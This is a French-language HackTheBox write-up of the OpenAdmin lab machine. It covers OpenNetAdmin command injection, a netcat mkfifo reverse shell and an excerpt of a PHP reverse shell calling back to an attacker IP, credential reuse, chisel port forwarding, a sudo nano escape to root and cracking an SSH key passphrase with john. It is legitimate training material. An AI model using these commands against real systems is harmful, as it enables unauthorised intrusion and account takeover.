---
title: HTB | OpenAdmin
description: OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.
slug: openadmin-htb
date: 2025-01-20 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="OpenAdmin cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">OpenAdmin</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.171</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
jimmy:n1nj4W4rri0R!
```

## Enumeration

### nmap
```bash
$ nmap -sS -sC -sV -An -p22,80 -vvv 10.10.10.171

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## Foothold

### dirsearch : openadmin.htb
```bash
$ dirsearch -u http://openadmin.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/htb/OpenAdmin/reports/http_openadmin.htb/_25-01-13_17-16-56.txt

Target: http://openadmin.htb/

[17:16:57] Starting: 
[17:16:58] 403 -  278B  - /.ht_wsr.txt                                      
[17:16:58] 403 -  278B  - /.htaccess.bak1                                   
[17:16:58] 403 -  278B  - /.htaccess.orig                                   
[17:16:58] 403 -  278B  - /.htaccess.save
[17:16:58] 403 -  278B  - /.htaccess.sample
[17:16:58] 403 -  278B  - /.htaccess_extra                                  
[17:16:58] 403 -  278B  - /.htaccess_sc
[17:16:58] 403 -  278B  - /.htaccessBAK
[17:16:58] 403 -  278B  - /.htaccess_orig
[17:16:58] 403 -  278B  - /.htaccessOLD
[17:16:58] 403 -  278B  - /.htaccessOLD2
[17:16:58] 403 -  278B  - /.htm                                             
[17:16:58] 403 -  278B  - /.html
[17:16:58] 403 -  278B  - /.htpasswd_test                                   
[17:16:58] 403 -  278B  - /.htpasswds
[17:16:58] 403 -  278B  - /.httr-oauth                                      
[17:16:59] 403 -  278B  - /.php                                             
[17:17:24] 301 -  314B  - /music  ->  http://openadmin.htb/music/           
[17:17:26] 301 -  312B  - /ona  ->  http://openadmin.htb/ona/             <--------------------------
[17:17:32] 403 -  278B  - /server-status                                    
[17:17:32] 403 -  278B  - /server-status/                                   
                                                                             
Task Completed
```

### ona - Open Net Admin
http://openadmin.htb/ona/

"You are NOT on the latest release version
Your version    = v18.1.1"

```bash
$ searchsploit open net admin
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                   |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                                                                    | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                                                                     | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                                                                      | php/webapps/47691.sh
SCO OpenServer 5.0.6 - lpadmin Buffer Overflow                                                                                                                                                   | sco/dos/20735.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Voici un exploit python fonctionnel trouvé sur github:
https://github.com/amriunix/ona-rce

```bash
python3 ona_exploit.py exploit http://openadmin.htb/ona
...
sh$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.2 1337 >/tmp/f

---------------------------------------------------

$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.171] 45688
sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@openadmin:/opt/ona/www$ export TERM=xterm
export TERM=xterm
www-data@openadmin:/opt/ona/www$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 1337

www-data@openadmin:/opt/ona/www$ whoami
www-data

```

### mysql

```bash
www-data@openadmin:/opt/ona/www$ grep -ri "passwd"
plugins/ona_nmap_scans/install.php:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
include/functions_db.inc.php:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
.htaccess.example:# You will need to create an .htpasswd file that conforms to the standard
.htaccess.example:# htaccess format, read the man page for htpasswd.  Change the 
.htaccess.example:# AuthUserFile option below as needed to reference your .htpasswd file.
.htaccess.example:# names, however, do need to be the same in both the .htpasswd and web
.htaccess.example:    #AuthUserFile /opt/ona/www/.htpasswd

===========================
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
===========================

winc/user_edit.inc.php:                    name="passwd"
winc/user_edit.inc.php:    if (!$form['id'] and !$form['passwd']) {
winc/user_edit.inc.php:    if ($form['passwd']) {
winc/user_edit.inc.php:        $form['passwd'] = md5($form['passwd']);
winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
winc/user_edit.inc.php:        if (strlen($form['passwd']) < 32) {
winc/user_edit.inc.php:            $form['passwd'] = $record['passwd'];
winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
winc/tooltips.inc.php://     Builds HTML for changing tacacs enable passwd

$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

```
On ne trouve rien d'intéressant dans la base de donnée mysql, cependant, le mot de passe fonctionne pour se connecter à l'utilisateur `jimmy`:

`jimmy`:`n1nj4W4rri0R!`

```bash
www-data@openadmin:/opt/ona/www$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www$ whoami
jimmy
```

On peut aussi se connecter en ssh :

```bash
$ ssh jimmy@openadmin.htb
The authenticity of host 'openadmin.htb (10.10.10.171)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'openadmin.htb' (ED25519) to the list of known hosts.
jimmy@openadmin.htb's password: 

Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ whoami
jimmy
```

## jimmy -> joanna

### internal : apache service
On trouve un dossier "internal" avec du code php indiquant un autre serveur apache. Il s'agit d'une page de connexion avec un user "jimmy" et le hash de son mot de passe :

```bash
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                              
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

`index.php`:
```bash

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>

```

Dans crackstation, on trouve le mot de passe du hash : 'Revealed'.
On observe que si on se connecte avec jimmy:Revealed, on se retrouve sur la page main qui semble afficher la clé SSH de l'utilisatrice "joanna".

`main.php`:
```bash
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
## Open Admin Trusted
## OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

On voit les configurations de ce deuxieme serveur apache:
```bash
jimmy@openadmin:/tmp$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
Il tourne donc sur le port 52846. On peut aussi observer que ce port est bien ouvert avec la commande "ss" :
```bash
$ ss -nlta
State                   Recv-Q                Send-Q                                        Local Address:Port                                       Peer Address:Port                
LISTEN                  0                     128                                           127.0.0.53%lo:53                                              0.0.0.0:*                   
LISTEN                  0                     128                                                 0.0.0.0:22                                              0.0.0.0:*                   
LISTEN                  0                     80                                                127.0.0.1:3306                                            0.0.0.0:*                   
LISTEN                  0                     128                                               127.0.0.1:52846                                           0.0.0.0:*                   
CLOSE-WAIT              0                     0                                              10.10.10.171:35776                                        10.10.16.2:1337                
CLOSE-WAIT              0                     0                                              10.10.10.171:36134                                        10.10.16.2:1337                
SYN-SENT                0                     1                                              10.10.10.171:55916                                           1.1.1.1:53                  
ESTAB                   0                     36                                             10.10.10.171:22                                           10.10.16.2:36932               
CLOSE-WAIT              0                     0                                              10.10.10.171:35848                                        10.10.16.2:1337                
ESTAB                   0                     0                                              10.10.10.171:22                                           10.10.16.2:44542               
ESTAB                   0                     0                                              10.10.10.171:36824                                        10.10.16.2:1337                
LISTEN                  0                     128                                                    [::]:22                                                 [::]:*                   
LISTEN                  0                     128                                                       *:80                                                    *:*                   
CLOSE-WAIT              1                     0                                     [::ffff:10.10.10.171]:80                                  [::ffff:10.10.16.2]:58916               
CLOSE-WAIT              1                     0                                     [::ffff:10.10.10.171]:80                                  [::ffff:10.10.16.2]:49868               
CLOSE-WAIT              1                     0                                     [::ffff:10.10.10.171]:80                                  [::ffff:10.10.16.2]:37876               
CLOSE-WAIT              1                     0                                     [::ffff:10.10.10.171]:80                                  [::ffff:10.10.16.2]:38320
```

Pour accéder à ce serveur apache, on doit rediriger le port 52846 en local. On peut faire ca très facilement à l'aide "chisel" pour faire du port forwarding :
```bash
jimmy@openadmin:/tmp$ ./chiselserver_linux client 10.10.16.2:8081 R:52846:127.0.0.1:52846
2025/01/20 10:10:38 client: Connecting to ws://10.10.16.2:8080
2025/01/20 10:10:38 client: Connected (Latency 34.737115ms)

----------------------------------------------------

$ ./chiselserver_linux server -p 8081 --reverse 
2025/01/20 05:09:33 server: Reverse tunnelling enabled
2025/01/20 05:09:33 server: Fingerprint 1ytgJA0Yrt37Nd/YOVUXpE2VjZp29m7JvW5jTyjZ9D4=
2025/01/20 05:09:33 server: Listening on http://0.0.0.0:8080
2025/01/20 05:10:03 server: session#1: tun: proxy#R:52846=>52846: Listening
```
Depuis notre kali, on accéde à la page puis (apres connexion jimmy:Revealed) on obtient: 
`http://localhost:52846/main.php`
```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----

Don't forget your "ninja" password
Click here to logout Session 
```

On peut modifier le fichier `main.php` avec jimmy pour ouvrir un reverse shell avec le user joanna :

```bash
## On utilise un script "php-reverse-shell.php pour ouvrir un reverse shell
## on le place dans le dossier internal, puis on l'execute depuis le navigateur:
## http://localhost:52846/php-reverse-shell.php

...
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.2';  // CHANGE THIS
$port = 1338;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//
...

--------------------------------------

┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.171] 60408
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:51:59 up 6 min,  1 user,  load average: 0.00, 0.10, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jimmy    pts/0    10.10.16.2       10:48   15.00s  0.08s  0.07s -bash
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
joanna@openadmin:/$ export TERM=xterm
export TERM=xterm
joanna@openadmin:/$ ^Z
zsh: suspended  nc -lnvp 1338
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ stty raw -echo; fg     
[1]  + continued  nc -lnvp 1338

joanna@openadmin:/$ 
joanna@openadmin:/$ whoami
joanna
joanna@openadmin:/$ cd /home/joanna/
joanna@openadmin:/home/joanna$ ls
user.txt
joanna@openadmin:/home/joanna$ cat user.txt 
11dc.....75aa
```

### SSH : joanna

```bash
┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ ssh-keygen -t rsa -b 2048 -f joanna_key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in joanna_key
Your public key has been saved in joanna_key.pub
The key fingerprint is:
SHA256:w3+Bf3zBE44h5De2+Y3MmwMIZVTWG2HoIJYslnAWVDU kali@kali
The key's randomart image is:
+---[RSA 2048]----+
|    .o==.+Eoooo. |
|     o+ = *o..o  |
|     . o + = = + |
|       ..  .= X .|
|        S....+ = |
|         o...=..+|
|          . o.*.o|
|           . ..+ |
|              o. |
+----[SHA256]-----+
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ cat joanna_key.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS5cj9VZMFNS/Ga0vlT44cnx1HTDMQo3WpDw94nizBdQBMKYk5XmaKFMZdKxeGKNIEERpbKGObTXwbDix9JYY9aA1M4/l/tOSY97w3kMXlRrwJppGIedXyDmAsPjIjQUpFQ00ZPEClME0OQXDzQHxDtkFm6kvefiiI5jLt0+aqvWqkPjbpOlBnm60PuxYsSrPLIUjvw6JUt/ckece553L+BPzwO6HfLuk3wH6i9CGocS90CIu1M00vrkTi3CJVTcCowx8u81bQmM3b/NMksEDC38Xf4gL1ZA4QI5zVqIptxQPuOkBJWFmgkPrzE6Fniod0VGHIn/WMBdJAc/XAhpu/ kali@kali
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ ssh -i joanna_key joanna@openadmin.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 20 10:59:11 UTC 2025

  System load:  0.0               Processes:             178
  Usage of /:   31.1% of 7.81GB   Users logged in:       1
  Memory usage: 9%                IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ 

```
On place dans authorized_key de joanna, et on peut ssh sans soucis...

## joanna -> root

### Enumeration
```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

### nano as root
https://gtfobins.github.io/gtfobins/nano/

Sur gtfobins, on cherche comment elever ses privilèges à l'aide de nano. On trouve la commande suivante :
```bash
nano
^R^X
reset; sh 1>&0 2>&0
```
On obtient ensuite un shell en tant que root :
```bash
## whoami
root
## cd /root
## cat root.txt
?????????????
```

## BONUS: ssh2john et john pour cracker le mot de passe de joanna
```bash
┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ ssh2john old_joanna.pem 
old_joanna.pem:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ echo 'old_joanna.pem:$sshng$1$16$2AF2......................1a484d62d602903793d10d' > hash.txt

┌──(kali㉿kali)-[~/htb/OpenAdmin]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

bloodninjas      (old_joanna.pem)     <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

1g 0:00:00:04 DONE (2025-01-20 08:36) 0.2212g/s 2118Kp/s 2118Kc/s 2118KC/s bloodninjas..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably

## On trouve le mot de passe bloodninjas de JOANNA
```